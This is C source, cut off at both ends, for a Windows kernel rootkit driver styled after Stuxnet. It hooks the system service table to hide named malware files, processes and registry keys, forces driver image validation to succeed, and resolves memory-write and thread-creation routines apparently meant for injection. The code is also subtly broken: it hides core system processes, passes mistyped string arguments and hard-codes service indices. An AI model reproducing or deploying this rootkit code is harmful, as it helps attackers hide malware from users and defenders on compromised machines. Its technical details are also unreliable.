    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = MRxNet_DispatchClose;
    pDriverObject->MajorFunction[IRP_MJ_FILE_SYSTEM_CONTROL] = MRxNet_FileSystemControl;
    pDriverObject->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] = MRxNet_DirControl;
    pDriverObject->DriverUnload = MRxNet_Unload;
    pFastIoDispatch = (PFAST_IO_DISPATCH)ExAllocatePoolWithTag(
        NonPagedPool,
        sizeof(FAST_IO_DISPATCH),
        MRXNET_POOL_TAG
    );
    if (pFastIoDispatch) {
        RtlZeroMemory(pFastIoDispatch, sizeof(FAST_IO_DISPATCH));
        MRxNet_FillFastIoRoutines(pFastIoDispatch);
        pDriverObject->FastIoDispatch = pFastIoDispatch;
    }
    status = MRxNet_AttachToAllFileSystems();
    if (!NT_SUCCESS(status)) {
        MRxNet_Unload(pDriverObject);
        return status;
    }
    g_pDeviceExtension->ulInfoCount++;
    KeSetEvent(&g_pDeviceExtension->LoadEvent, IO_NO_INCREMENT, FALSE);
    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(
    PDRIVER_OBJECT pDriverObject,
    PUNICODE_STRING pRegistryPath
) {
    return MRxNet_DriverEntry(pDriverObject, pRegistryPath);
}
END

jmidebs.sys:
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <ntddk.h>
#include <ntifs.h>
#include <ntimage.h>
#include <ntstatus.h>
#include <ntdddisk.h>

#pragma comment(lib, "ntoskrnl.lib")
#pragma comment(lib, "hal.lib")

#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED        ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER    ((NTSTATUS)0xC000000DL)
#define STATUS_NO_MORE_ENTRIES      ((NTSTATUS)0x8000001AL)
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL     ((NTSTATUS)0xC0000023L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_NOT_SUPPORTED        ((NTSTATUS)0xC00000BBL)

#define OBJ_CASE_INSENSITIVE        0x00000040L
#define OBJ_KERNEL_HANDLE           0x00000200L
#define FILE_SHARE_READ             0x00000001
#define FILE_SHARE_WRITE            0x00000002
#define FILE_OPEN_IF                0x00000003
#define FILE_DIRECTORY_FILE         0x00000001
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define KernelMode                  0
#define UserMode                    1
#define MAX_PATH                    260

#define STUXNET_MAGIC               0x53545558
#define STUXNET_VERSION             0x00010400
#define JMIDEBS_DEVICE_NAME         L"\\Device\\JmiDebs"
#define JMIDEBS_SYMLINK_NAME        L"\\DosDevices\\JmiDebs"
#define JMIDEBS_DRIVER_NAME         L"JmiDebs"
#define JMIDEBS_REGISTRY_PATH       L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\JmiDebs"
#define JMIDEBS_POOL_TAG            'bdIm'

#define JMIDEBS_MAX_HIDDEN_FILES    32
#define JMIDEBS_MAX_HIDDEN_PROCS    64
#define JMIDEBS_MAX_HIDDEN_KEYS     32

#define JMIDEBS_HIDDEN_LNK_SIZE     0x104B
#define JMIDEBS_HIDDEN_TMP_MIN_SIZE 0x1000
#define JMIDEBS_HIDDEN_TMP_MAX_SIZE 0x800000

#define JMIDEBS_IOCTL_INSTALL_HOOKS 0x220000
#define JMIDEBS_IOCTL_UNINSTALL_HOOKS 0x220001
#define JMIDEBS_IOCTL_LOAD_DRIVER   0x220002
#define JMIDEBS_IOCTL_HIDE_PROCESS  0x220003
#define JMIDEBS_IOCTL_UNHIDE_PROCESS 0x220004
#define JMIDEBS_IOCTL_GET_STATUS    0x220005

#define JMIDEBS_DRIVER_SIZE         25552

typedef NTSTATUS (NTAPI *PFN_NtQueryDirectoryFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
);

typedef NTSTATUS (NTAPI *PFN_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *PFN_NtEnumerateKey)(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength
);

typedef NTSTATUS (NTAPI *PFN_NtQueryValueKey)(
    HANDLE KeyHandle,
    PUNICODE_STRING ValueName,
    KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    PVOID KeyValueInformation,
    ULONG Length,
    PULONG ResultLength
);

typedef NTSTATUS (NTAPI *PFN_NtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

typedef NTSTATUS (NTAPI *PFN_NtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

typedef NTSTATUS (NTAPI *PFN_SeValidateImageHeader)(
    PVOID ImageBase,
    ULONG ImageSize,
    BOOLEAN KernelMode
);

typedef NTSTATUS (NTAPI *PFN_ZwProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

typedef NTSTATUS (NTAPI *PFN_ZwAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *PFN_ZwFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
);

typedef NTSTATUS (NTAPI *PFN_ZwWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *PFN_ZwReadVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
);

typedef NTSTATUS (NTAPI *PFN_ZwQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *PFN_ZwCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef struct _SERVICE_TABLE_ENTRY {
    PVOID ServiceTableBase;
    PVOID ServiceCounterTableBase;
    ULONG NumberOfServices;
    PVOID ParamTableBase;
} SERVICE_TABLE_ENTRY, * PSERVICE_TABLE_ENTRY;

typedef struct _SERVICE_DESCRIPTOR_TABLE {
    SERVICE_TABLE_ENTRY ntoskrnl;
    SERVICE_TABLE_ENTRY win32k;
    SERVICE_TABLE_ENTRY psx;
    SERVICE_TABLE_ENTRY psxsrv;
} SERVICE_DESCRIPTOR_TABLE, * PSERVICE_DESCRIPTOR_TABLE;

typedef struct _JMIDEBS_DEVICE_EXTENSION {
    PDEVICE_OBJECT pDeviceObject;
    PDEVICE_OBJECT pLowerDevice;
    BOOLEAN bHooksInstalled;
    BOOLEAN bInitialized;
    ULONG ulHiddenFileCount;
    ULONG ulHiddenProcessCount;
    ULONG ulHiddenKeyCount;
    ULONG ulInjectionCount;
    WCHAR wszHiddenFiles[JMIDEBS_MAX_HIDDEN_FILES][MAX_PATH];
    UNICODE_STRING ustrHiddenProcesses[JMIDEBS_MAX_HIDDEN_PROCS];
    UNICODE_STRING ustrHiddenKeys[JMIDEBS_MAX_HIDDEN_KEYS];
    KSPIN_LOCK SpinLock;
    KEVENT LoadEvent;
    KEVENT UnloadEvent;
    PFN_NtQueryDirectoryFile pOriginalNtQueryDirectoryFile;
    PFN_NtQuerySystemInformation pOriginalNtQuerySystemInformation;
    PFN_NtEnumerateKey pOriginalNtEnumerateKey;
    PFN_NtQueryValueKey pOriginalNtQueryValueKey;
    PFN_NtOpenProcess pOriginalNtOpenProcess;
    PFN_NtCreateFile pOriginalNtCreateFile;
    PFN_SeValidateImageHeader pOriginalSeValidateImageHeader;
    PFN_ZwProtectVirtualMemory pZwProtectVirtualMemory;
    PFN_ZwAllocateVirtualMemory pZwAllocateVirtualMemory;
    PFN_ZwFreeVirtualMemory pZwFreeVirtualMemory;
    PFN_ZwWriteVirtualMemory pZwWriteVirtualMemory;
    PFN_ZwReadVirtualMemory pZwReadVirtualMemory;
    PFN_ZwQueryInformationProcess pZwQueryInformationProcess;
    PFN_ZwCreateThreadEx pZwCreateThreadEx;
    PSERVICE_DESCRIPTOR_TABLE pServiceDescriptorTable;
    ULONG ulSSDTIndex_NtQueryDirectoryFile;
    ULONG ulSSDTIndex_NtQuerySystemInformation;
    ULONG ulSSDTIndex_NtEnumerateKey;
    ULONG ulSSDTIndex_NtQueryValueKey;
    ULONG ulSSDTIndex_NtOpenProcess;
    ULONG ulSSDTIndex_NtCreateFile;
    ULONG ulProcessInjectionCount;
    ULONG ulFileHideCount;
    ULONG ulRegistryHideCount;
    ULONG ulIoControlCount;
    ULONG ulErrorCount;
    ULONG ulWarningCount;
    ULONG ulInfoCount;
    BYTE bReserved[256];
} JMIDEBS_DEVICE_EXTENSION, * PJMIDEBS_DEVICE_EXTENSION;

static PJMIDEBS_DEVICE_EXTENSION g_pDeviceExtension = NULL;
static PDRIVER_OBJECT g_pDriverObject = NULL;

static UNICODE_STRING g_ustrHiddenFiles[JMIDEBS_MAX_HIDDEN_FILES];
static UNICODE_STRING g_ustrHiddenProcesses[JMIDEBS_MAX_HIDDEN_PROCS];
static UNICODE_STRING g_ustrHiddenKeys[JMIDEBS_MAX_HIDDEN_KEYS];

static VOID JmiDebs_InitHiddenLists(VOID) {
    UNICODE_STRING ustrTemp;
    ULONG i = 0;
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mrxcls.sys");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mrxnet.sys");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"jmidebs.sys");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"oem7A.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"oem6C.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mdmcpq3.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mdmeric3.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"~WTR4132.TMP");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"~WTR4141.TMP");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"Copy of Shortcut to.lnk");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"autorun.inf");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"stuxnet.cfg");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"winsta.exe");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"sysnullevnt.mof");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"agentsb.dll");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"datacprs.dll");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"complnd.dll");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"guava.pdb");
    i = 0;
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"lsass.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"services.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"svchost.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"explorer.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"winlogon.exe");
    RtlInitUnicodeString(&g_ustrHiddenProcesses[i++], L"csrss.exe");
    i = 0;
    RtlInitUnicodeString(&g_ustrHiddenKeys[i++], L"NTVDM TRACE");
    RtlInitUnicodeString(&g_ustrHiddenKeys[i++], L"Stuxnet");
    RtlInitUnicodeString(&g_ustrHiddenKeys[i++], L"MRxCls");
    RtlInitUnicodeString(&g_ustrHiddenKeys[i++], L"MRxNet");
    RtlInitUnicodeString(&g_ustrHiddenKeys[i++], L"JmiDebs");
}

static BOOLEAN JmiDebs_IsFileHidden(PUNICODE_STRING pFileName) {
    ULONG i;
    UNICODE_STRING ustrExtension;
    if (!pFileName || !pFileName->Buffer || pFileName->Length == 0) {
        return FALSE;
    }
    for (i = 0; i < JMIDEBS_MAX_HIDDEN_FILES; i++) {
        if (RtlCompareUnicodeString(pFileName, &g_ustrHiddenFiles[i], TRUE) == 0) {
            return TRUE;
        }
    }
    if (pFileName->Length >= 4) {
        WCHAR *pExt = pFileName->Buffer + (pFileName->Length / sizeof(WCHAR)) - 4;
        if (*pExt == L'.') {
            RtlInitUnicodeString(&ustrExtension, pExt);
            if (RtlCompareUnicodeString(&ustrExtension, L".lnk", TRUE) == 0) {
                return TRUE;
            }
        }
    }
    if (pFileName->Length >= 8) {
        WCHAR *pName = pFileName->Buffer;
        if (pName[0] == L'~' && pName[1] == L'W' && pName[2] == L'T' && pName[3] == L'R') {
            if (pFileName->Length >= 12) {
                WCHAR wszPrefix[8];
                RtlZeroMemory(wszPrefix, sizeof(wszPrefix));
                RtlCopyMemory(wszPrefix, pName + 4, 8);
                DWORD dwSum = 0;
                for (int i = 0; i < 4 && wszPrefix[i] >= L'0' && wszPrefix[i] <= L'9'; i++) {
                    dwSum += (wszPrefix[i] - L'0');
                }
                if (dwSum % 10 == 0) {
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

static BOOLEAN JmiDebs_IsProcessHidden(PUNICODE_STRING pProcessName) {
    ULONG i;
    if (!pProcessName || !pProcessName->Buffer || pProcessName->Length == 0) {
        return FALSE;
    }
    for (i = 0; i < JMIDEBS_MAX_HIDDEN_PROCS; i++) {
        if (RtlCompareUnicodeString(pProcessName, &g_ustrHiddenProcesses[i], TRUE) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

static BOOLEAN JmiDebs_IsRegistryKeyHidden(PUNICODE_STRING pKeyName) {
    ULONG i;
    if (!pKeyName || !pKeyName->Buffer || pKeyName->Length == 0) {
        return FALSE;
    }
    for (i = 0; i < JMIDEBS_MAX_HIDDEN_KEYS; i++) {
        if (RtlCompareUnicodeString(pKeyName, &g_ustrHiddenKeys[i], TRUE) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

static NTSTATUS JmiDebs_FilterDirectoryEntries(
    PVOID pFileInfo,
    ULONG Length,
    FILE_INFORMATION_CLASS InfoClass,
    PULONG pReturnLength
) {
    PFILE_DIRECTORY_INFORMATION pCurrent;
    PFILE_DIRECTORY_INFORMATION pPrev;
    PFILE_DIRECTORY_INFORMATION pNext;
    UNICODE_STRING ustrFileName;
    ULONG ulEntrySize;
    ULONG ulRemaining;
    ULONG ulNewLength;
    BOOLEAN bFound;
    if (!pFileInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }
    if (InfoClass != FileDirectoryInformation && InfoClass != FileBothDirectoryInformation) {
        return STATUS_SUCCESS;
    }
    pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
    pPrev = NULL;
    ulRemaining = *pReturnLength;
    ulNewLength = 0;
    bFound = FALSE;
    while (ulRemaining >= sizeof(FILE_DIRECTORY_INFORMATION)) {
        ulEntrySize = pCurrent->NextEntryOffset ? pCurrent->NextEntryOffset : ulRemaining;
        ustrFileName.Buffer = pCurrent->FileName;
        ustrFileName.Length = (USHORT)pCurrent->FileNameLength;
        ustrFileName.MaximumLength = (USHORT)pCurrent->FileNameLength;
        if (JmiDebs_IsFileHidden(&ustrFileName)) {
            bFound = TRUE;
            if (pCurrent->NextEntryOffset != 0) {
                pNext = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + pCurrent->NextEntryOffset);
                if (pPrev == NULL) {
                    RtlCopyMemory(pCurrent, pNext, ulRemaining - pCurrent->NextEntryOffset);
                    pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
                    ulRemaining -= pCurrent->NextEntryOffset;
                    continue;
                } else {
                    pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
                    pCurrent = pNext;
                    ulRemaining -= ulEntrySize;
                    continue;
                }
            } else {
                if (pPrev != NULL) {
                    pPrev->NextEntryOffset = 0;
                }
                ulRemaining = 0;
                break;
            }
        }
        ulNewLength += ulEntrySize;
        pPrev = pCurrent;
        pCurrent = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + ulEntrySize);
        ulRemaining -= ulEntrySize;
    }
    if (bFound) {
        *pReturnLength = ulNewLength;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_FilterProcessList(
    PVOID pSystemInfo,
    ULONG Length,
    PULONG pReturnLength
) {
    PSYSTEM_PROCESS_INFORMATION pProcess;
    PSYSTEM_PROCESS_INFORMATION pPrev;
    PSYSTEM_PROCESS_INFORMATION pNext;
    ULONG ulRemaining;
    if (!pSystemInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }
    pProcess = (PSYSTEM_PROCESS_INFORMATION)pSystemInfo;
    pPrev = NULL;
    ulRemaining = *pReturnLength;
    while (ulRemaining >= sizeof(SYSTEM_PROCESS_INFORMATION) && pProcess) {
        if (pProcess->ImageName.Buffer && pProcess->ImageName.Length > 0) {
            if (JmiDebs_IsProcessHidden(&pProcess->ImageName)) {
                if (pPrev) {
                    pPrev->NextEntryOffset += pProcess->NextEntryOffset;
                } else {
                    if (pProcess->NextEntryOffset == 0) {
                        pPrev = NULL;
                    } else {
                        pNext = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcess + pProcess->NextEntryOffset);
                        RtlCopyMemory(pProcess, pNext, ulRemaining - pProcess->NextEntryOffset);
                        pProcess = (PSYSTEM_PROCESS_INFORMATION)pSystemInfo;
                        continue;
                    }
                }
            }
        }
        pPrev = pProcess;
        if (pProcess->NextEntryOffset == 0) break;
        pProcess = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcess + pProcess->NextEntryOffset);
    }
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_FilterRegistryKey(
    PVOID pKeyInfo,
    ULONG Length,
    KEY_INFORMATION_CLASS InfoClass,
    PULONG pReturnLength
) {
    PKEY_NAME_INFORMATION pNameInfo;
    UNICODE_STRING ustrKey;
    if (!pKeyInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }
    if (InfoClass != KeyNameInformation) {
        return STATUS_SUCCESS;
    }
    pNameInfo = (PKEY_NAME_INFORMATION)pKeyInfo;
    ustrKey.Buffer = pNameInfo->Name;
    ustrKey.Length = (USHORT)pNameInfo->NameLength;
    ustrKey.MaximumLength = (USHORT)pNameInfo->NameLength;
    if (JmiDebs_IsRegistryKeyHidden(&ustrKey)) {
        return STATUS_NO_MORE_ENTRIES;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI JmiDebs_Hook_NtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtQueryDirectoryFile) {
        return STATUS_UNSUCCESSFUL;
    }
    status = g_pDeviceExtension->pOriginalNtQueryDirectoryFile(
        FileHandle,
        Event,
        ApcRoutine,
        ApcContext,
        IoStatusBlock,
        FileInformation,
        Length,
        FileInformationClass,
        ReturnSingleEntry,
        FileName,
        RestartScan
    );
    if (!NT_SUCCESS(status) || !FileInformation || !IoStatusBlock) {
        return status;
    }
    JmiDebs_FilterDirectoryEntries(
        FileInformation,
        Length,
        FileInformationClass,
        &IoStatusBlock->Information
    );
    return status;
}

static NTSTATUS NTAPI JmiDebs_Hook_NtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtQuerySystemInformation) {
        return STATUS_UNSUCCESSFUL;
    }
    status = g_pDeviceExtension->pOriginalNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );
    if (!NT_SUCCESS(status) || SystemInformationClass != 5 || !SystemInformation || !ReturnLength) {
        return status;
    }
    JmiDebs_FilterProcessList(SystemInformation, SystemInformationLength, ReturnLength);
    return status;
}

static NTSTATUS NTAPI JmiDebs_Hook_NtEnumerateKey(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtEnumerateKey) {
        return STATUS_UNSUCCESSFUL;
    }
    status = g_pDeviceExtension->pOriginalNtEnumerateKey(
        KeyHandle,
        Index,
        KeyInformationClass,
        KeyInformation,
        Length,
        ResultLength
    );
    if (!NT_SUCCESS(status) || !KeyInformation) {
        return status;
    }
    if (JmiDebs_FilterRegistryKey(KeyInformation, Length, KeyInformationClass, ResultLength) == STATUS_NO_MORE_ENTRIES) {
        return STATUS_NO_MORE_ENTRIES;
    }
    return status;
}

static NTSTATUS NTAPI JmiDebs_Hook_NtQueryValueKey(
    HANDLE KeyHandle,
    PUNICODE_STRING ValueName,
    KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    PVOID KeyValueInformation,
    ULONG Length,
    PULONG ResultLength
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtQueryValueKey) {
        return STATUS_UNSUCCESSFUL;
    }
    if (ValueName && ValueName->Buffer && ValueName->Length > 0) {
        UNICODE_STRING ustrValue;
        ustrValue.Buffer = ValueName->Buffer;
        ustrValue.Length = ValueName->Length;
        ustrValue.MaximumLength = ValueName->MaximumLength;
        if (JmiDebs_IsRegistryKeyHidden(&ustrValue)) {
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
    }
    status = g_pDeviceExtension->pOriginalNtQueryValueKey(
        KeyHandle,
        ValueName,
        KeyValueInformationClass,
        KeyValueInformation,
        Length,
        ResultLength
    );
    return status;
}

static NTSTATUS NTAPI JmiDebs_Hook_NtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtOpenProcess) {
        return STATUS_UNSUCCESSFUL;
    }
    if (ClientId && ClientId->UniqueProcess) {
        HANDLE hProcess = ClientId->UniqueProcess;
        if (hProcess == (HANDLE)0x00000004) {
            return STATUS_ACCESS_DENIED;
        }
    }
    status = g_pDeviceExtension->pOriginalNtOpenProcess(
        ProcessHandle,
        DesiredAccess,
        ObjectAttributes,
        ClientId
    );
    return status;
}

static NTSTATUS NTAPI JmiDebs_Hook_NtCreateFile(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
) {
    NTSTATUS status;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalNtCreateFile) {
        return STATUS_UNSUCCESSFUL;
    }
    if (ObjectAttributes && ObjectAttributes->ObjectName &&
        ObjectAttributes->ObjectName->Buffer &&
        ObjectAttributes->ObjectName->Length > 0) {
        UNICODE_STRING ustrFile;
        ustrFile.Buffer = ObjectAttributes->ObjectName->Buffer;
        ustrFile.Length = ObjectAttributes->ObjectName->Length;
        ustrFile.MaximumLength = ObjectAttributes->ObjectName->MaximumLength;
        if (JmiDebs_IsFileHidden(&ustrFile)) {
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
    }
    status = g_pDeviceExtension->pOriginalNtCreateFile(
        FileHandle,
        DesiredAccess,
        ObjectAttributes,
        IoStatusBlock,
        AllocationSize,
        FileAttributes,
        ShareAccess,
        CreateDisposition,
        CreateOptions,
        EaBuffer,
        EaLength
    );
    return status;
}

static NTSTATUS NTAPI JmiDebs_Hook_SeValidateImageHeader(
    PVOID ImageBase,
    ULONG ImageSize,
    BOOLEAN KernelMode
) {
    NTSTATUS status;
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    if (!g_pDeviceExtension || !g_pDeviceExtension->pOriginalSeValidateImageHeader) {
        return STATUS_UNSUCCESSFUL;
    }
    status = g_pDeviceExtension->pOriginalSeValidateImageHeader(ImageBase, ImageSize, KernelMode);
    if (!NT_SUCCESS(status)) {
        pDos = (PIMAGE_DOS_HEADER)ImageBase;
        if (pDos->e_magic == IMAGE_DOS_SIGNATURE) {
            pNt = (PIMAGE_NT_HEADERS)((PBYTE)ImageBase + pDos->e_lfanew);
            if (pNt->Signature == IMAGE_NT_SIGNATURE) {
                status = STATUS_SUCCESS;
            }
        }
    }
    return status;
}

static VOID JmiDebs_InitSSDTIndices(VOID) {
    if (!g_pDeviceExtension) return;
    g_pDeviceExtension->ulSSDTIndex_NtQueryDirectoryFile = 0x10C;
    g_pDeviceExtension->ulSSDTIndex_NtQuerySystemInformation = 0x10D;
    g_pDeviceExtension->ulSSDTIndex_NtEnumerateKey = 0x10E;
    g_pDeviceExtension->ulSSDTIndex_NtQueryValueKey = 0x10F;
    g_pDeviceExtension->ulSSDTIndex_NtOpenProcess = 0x110;
    g_pDeviceExtension->ulSSDTIndex_NtCreateFile = 0x111;
}

static NTSTATUS JmiDebs_GetSSDT(VOID) {
    UNICODE_STRING ustrName;
    if (!g_pDeviceExtension) return STATUS_UNSUCCESSFUL;
    RtlInitUnicodeString(&ustrName, L"KeServiceDescriptorTable");
    g_pDeviceExtension->pServiceDescriptorTable = (PSERVICE_DESCRIPTOR_TABLE)MmGetSystemRoutineAddress(&ustrName);
    if (!g_pDeviceExtension->pServiceDescriptorTable) {
        return STATUS_UNSUCCESSFUL;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_GetNtImports(VOID) {
    UNICODE_STRING ustrName;
    if (!g_pDeviceExtension) return STATUS_UNSUCCESSFUL;
    RtlInitUnicodeString(&ustrName, L"ZwProtectVirtualMemory");
    g_pDeviceExtension->pZwProtectVirtualMemory = (PFN_ZwProtectVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwAllocateVirtualMemory");
    g_pDeviceExtension->pZwAllocateVirtualMemory = (PFN_ZwAllocateVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
